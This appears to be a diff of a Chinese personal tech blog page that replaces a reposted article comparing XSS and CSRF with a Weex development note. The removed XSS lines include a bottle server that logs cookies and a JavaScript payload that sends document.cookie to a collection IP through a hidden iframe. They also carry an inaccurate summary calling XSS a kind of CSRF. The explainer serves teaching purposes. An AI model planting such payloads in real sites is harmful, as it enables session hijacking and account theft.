@@ -6,24 +6,35 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://ganchengyuan1990.github.io/blog">
-  <title>XSS和CSRF对比 | 时间追逐者</title>
+  <title>Weex首秀(2) | 时间追逐者</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="转载：https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/
+  <meta name="description" content="首先祝各位鸡年大吉，开工大吉！趁着今天刚开公，工作任务还不多，可以继续学些Weex。
+春节在家无聊的时候，继续跟进了一下Weex的学习，主要把“关于我”这个Page进行了一些优化，这里主要是一些体力活，并没有太多可说的，简单总结以下几点：
 
-XSS：脚本中的不速之客XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面">
+Weex中所有的文字都要放在这个标签里，在普通的网页开发甚至Vue开发中，我偶尔会直接把文字放在div标签里，但是Weex中并不识别这样的语法。
+Weex的页">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS和CSRF对比">
-<meta property="og:url" content="https://ganchengyuan1990.github.io/blog/2017/01/19/XSS和CSRF对比/index.html">
+<meta property="og:title" content="Weex首秀(2)">
+<meta property="og:url" content="https://ganchengyuan1990.github.io/blog/2017/02/03/Weex首秀-2/index.html">
 <meta property="og:site_name" content="时间追逐者">
-<meta property="og:description" content="转载：https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/
+<meta property="og:description" content="首先祝各位鸡年大吉，开工大吉！趁着今天刚开公，工作任务还不多，可以继续学些Weex。
+春节在家无聊的时候，继续跟进了一下Weex的学习，主要把“关于我”这个Page进行了一些优化，这里主要是一些体力活，并没有太多可说的，简单总结以下几点：
 
-XSS：脚本中的不速之客XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面">
-<meta property="og:updated_time" content="2017-01-19T05:58:38.028Z">
+Weex中所有的文字都要放在这个标签里，在普通的网页开发甚至Vue开发中，我偶尔会直接把文字放在div标签里，但是Weex中并不识别这样的语法。
+Weex的页">
+<meta property="og:image" content="https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgetmsgimg?&MsgID=2139303078991437021&skey=%40crypt_472542a3_b6b3c065237c2db63a8092be298fbb9c">
+<meta property="og:image" content="https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgetmsgimg?&MsgID=6428966141898621484&skey=%40crypt_472542a3_b6b3c065237c2db63a8092be298fbb9c">
+<meta property="og:image" content="https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgetmsgimg?&MsgID=6508215180713760987&skey=%40crypt_472542a3_b6b3c065237c2db63a8092be298fbb9c">
+<meta property="og:image" content="https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgetmsgimg?&MsgID=1747607576204062505&skey=%40crypt_472542a3_b6b3c065237c2db63a8092be298fbb9c">
+<meta property="og:updated_time" content="2017-02-03T06:14:15.478Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XSS和CSRF对比">
-<meta name="twitter:description" content="转载：https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/
+<meta name="twitter:title" content="Weex首秀(2)">
+<meta name="twitter:description" content="首先祝各位鸡年大吉，开工大吉！趁着今天刚开公，工作任务还不多，可以继续学些Weex。
+春节在家无聊的时候，继续跟进了一下Weex的学习，主要把“关于我”这个Page进行了一些优化，这里主要是一些体力活，并没有太多可说的，简单总结以下几点：
 
-XSS：脚本中的不速之客XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面">
+Weex中所有的文字都要放在这个标签里，在普通的网页开发甚至Vue开发中，我偶尔会直接把文字放在div标签里，但是Weex中并不识别这样的语法。
+Weex的页">
+<meta name="twitter:image" content="https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgetmsgimg?&MsgID=2139303078991437021&skey=%40crypt_472542a3_b6b3c065237c2db63a8092be298fbb9c">
   
     <link rel="alternative" href="/atom.xml" title="时间追逐者" type="application/atom+xml">
   
@@ -173,34 +184,41 @@ XSS：脚本中的不速之客XSS 全称“跨站脚本”，是注入攻击的�
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-XSS和CSRF对比" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Weex首秀-2" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      XSS和CSRF对比
+      Weex首秀(2)
     </h1>
   
 
         
-        <a href="/blog/2017/01/19/XSS和CSRF对比/" class="archive-article-date">
-  	<time datetime="2017-01-19T01:11:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-01-19</time>
+        <a href="/blog/2017/02/03/Weex首秀-2/" class="archive-article-date">
+  	<time datetime="2017-02-03T01:13:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-03</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <font color="grey">转载：<a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/" target="_blank" rel="external">https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/</a></font>
+        <p>首先祝各位鸡年大吉，开工大吉！<br>趁着今天刚开公，工作任务还不多，可以继续学些Weex。</p>
+<p>春节在家无聊的时候，继续跟进了一下Weex的学习，主要把“关于我”这个Page进行了一些优化，这里主要是一些体力活，并没有太多可说的，简单总结以下几点：</p>
+<ol>
+<li>Weex中所有的文字都要放在<text></text>这个标签里，在普通的网页开发甚至Vue开发中，我偶尔会直接把文字放在div标签里，但是Weex中并不识别这样的语法。</li>
+<li>Weex的页面布局虽然也使用css语法，但是与Vue以及普通页面并不完全相同，我试验了一下，text-align：center必须用在text标签上，才能使文字居中，但是因为HTML并没有这个标签，所以要加载文字所在的父标签上，这个要注意，另外就是建议在Weex中多应用flex布局。</li>
+</ol>
+<p><img src="https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgetmsgimg?&MsgID=2139303078991437021&skey=%40crypt_472542a3_b6b3c065237c2db63a8092be298fbb9c" alt=""></p>
+<h2 id="外部链接问题"><a href="#外部链接问题" class="headerlink" title="外部链接问题"></a>外部链接问题</h2><p>在“关于我”这个page中，有一个需求，就是链接到外部网站，因为之前缺少APP开发经验，所以我想当然地认为这个问题非常简单，只需要价格a标签，或者像Vue一样采用Router的方法就可以了，但是后来发现这样并不能正常work。</p>
+<p>仔细一看，Demo中所有Router都是链接到项目内部页面的，看地址栏上每个页面其实都是一个经过build的Js文件，这点应该和Vue是类似的，但这个并不符合我的需求，并且外部网站是传统的静态页面，因此还是需要解决。</p>
+<p>首先抓包看看访问的URL是否正确:<br><img src="https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgetmsgimg?&MsgID=6428966141898621484&skey=%40crypt_472542a3_b6b3c065237c2db63a8092be298fbb9c" alt=""><br>由上图看”<a href="http://m.feiniu.com/my/order/index.html&quot;这个请求地址应该没有错，所以有可能是兼容问题。" target="_blank" rel="external">http://m.feiniu.com/my/order/index.html&quot;这个请求地址应该没有错，所以有可能是兼容问题。</a></p>
+<p>于是尝试捕捉error<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> &lt;web <span class="class"><span class="keyword">class</span></span>=<span class="string">"content"</span> id=<span class="string">"webview"</span> src=<span class="string">'https://m.taobao.com/?spm=0.0.0.0&amp;v=0#index'</span> onpagestart=<span class="string">"startload"</span> onpagefinish=<span class="string">"finishload"</span> onerror=<span class="string">"failload"</span>&gt;&lt;/web&gt;</div><div class="line"></div><div class="line">startload: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">  modal.toast(&#123; <span class="attr">message</span>: <span class="string">'pagestart'</span> &#125;)</div><div class="line">&#125;,</div><div class="line"><span class="attr">finishload</span>: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line">  modal.toast(&#123; <span class="attr">message</span>: <span class="string">'finishload'</span> &#125;)</div><div class="line">&#125;,</div><div class="line"><span class="attr">failload</span>: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">  modal.toast(&#123; <span class="attr">message</span>: event &#125;)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>使用不同的机器进行测试，安卓手机触发到了finishload事件，而IPHONE触发了failload事件，但是两个手机都无法正常显示网页。</p>
+<p>最后我在官方文档中查到这个：<br><img src="https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgetmsgimg?&MsgID=6508215180713760987&skey=%40crypt_472542a3_b6b3c065237c2db63a8092be298fbb9c" alt=""><br>web组件要求的weex版本是v0.5+，但是我的项目中用的是v0.32的，所以说看起来还是得仔细查查手册啊，之前在Vue项目中也碰到过这种组件兼容性问题。<br><img src="https://wx.qq.com/cgi-bin/mmwebwx-bin/webwxgetmsgimg?&MsgID=1747607576204062505&skey=%40crypt_472542a3_b6b3c065237c2db63a8092be298fbb9c" alt=""></p>
+<p>目前怀疑就是这个问题导致无法正常使用webview（未完待续）。</p>
 
-<h2 id="XSS：脚本中的不速之客"><a href="#XSS：脚本中的不速之客" class="headerlink" title="XSS：脚本中的不速之客"></a>XSS：脚本中的不速之客</h2><p>XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。</p>
-<p>运行预期之外的脚本带来的后果有很多中，可能只是简单的恶作剧——一个关不掉的窗口：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</div><div class="line">    alert(<span class="string">"你关不掉我~"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>也可以是盗号或者其他未授权的操作——我们来模拟一下这个过程，先建立一个用来收集信息的服务器：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line">跨站脚本注入的信息收集服务器</div><div class="line"></div><div class="line">"""javascript</div><div class="line"><span class="keyword">import</span> bottle</div><div class="line"></div><div class="line">app = bottle.Bottle()</div><div class="line">plugin = bottle.ext.sqlite.Plugin(dbfile=<span class="string">'/var/db/myxss.sqlite'</span>)</div><div class="line">app.install(plugin)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/myxss/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(cookies, db)</span>:</span></div><div class="line">    SQL = <span class="string">'INSERT INTO "myxss" ("cookies") VALUES (?)'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        db.execute(SQL, cookies)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    app.run()</div></pre></td></tr></table></figure>
-<p>然后在某一个页面的评论中注入这段代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt;  包起来放在评论中</span></div><div class="line"></div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</div><div class="line">    <span class="comment">// 构造泄露信息用的 URL</span></div><div class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</div><div class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</div><div class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</div><div class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></div><div class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</div><div class="line">    hideFrame.height = <span class="number">0</span>;</div><div class="line">    hideFrame.width = <span class="number">0</span>;</div><div class="line">    hideFrame.style.display = <span class="string">"none"</span>;</div><div class="line">    hideFrame.src = xssURI;</div><div class="line">    <span class="comment">// 开工</span></div><div class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</div><div class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</div></pre></td></tr></table></figure></p>
-<font color="red">个人总结：XSS是CSRF中的一种，是特指通过执行JS脚本来进行的攻击。CSRF则方式更多，比如通过代码中的逻辑问题去进行攻击，黑客通过伪装成用户进行攻击。</font>
       
 
       
@@ -234,7 +252,7 @@ XSS：脚本中的不速之客XSS 全称“跨站脚本”，是注入攻击的�
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">网络相关</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Vue</a>
         		</li>
       		
 		</ul>
@@ -290,7 +308,7 @@ XSS：脚本中的不速之客XSS 全称“跨站脚本”，是注入攻击的�
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=https://ganchengyuan1990.github.io/blog/2017/01/19/XSS和CSRF对比/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://ganchengyuan1990.github.io/blog/2017/02/03/Weex首秀-2/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -304,18 +322,9 @@ XSS：脚本中的不速之客XSS 全称“跨站脚本”，是注入攻击的�
   
 <nav id="article-nav">
   
-    <a href="/blog/2017/01/19/Js-载入defer和async方式的区别/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Js 载入defer和async方式的区别
-        
-      </div>
-    </a>
   
-  
-    <a href="/blog/2017/01/18/html-render-paint/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">html render &amp; paint（重排和重绘）</div>
+    <a href="/blog/2017/01/25/Weex首秀/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Weex首秀(1)</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -329,7 +338,7 @@ XSS：脚本中的不速之客XSS 全称“跨站脚本”，是注入攻击的�
   
   <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="XSS和CSRF对比" data-title="XSS和CSRF对比" data-url="https://ganchengyuan1990.github.io/blog/blog/2017/01/19/XSS和CSRF对比/"></div>
+	<div class="ds-thread" data-thread-key="Weex首秀-2" data-title="Weex首秀(2)" data-url="https://ganchengyuan1990.github.io/blog/blog/2017/02/03/Weex首秀-2/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
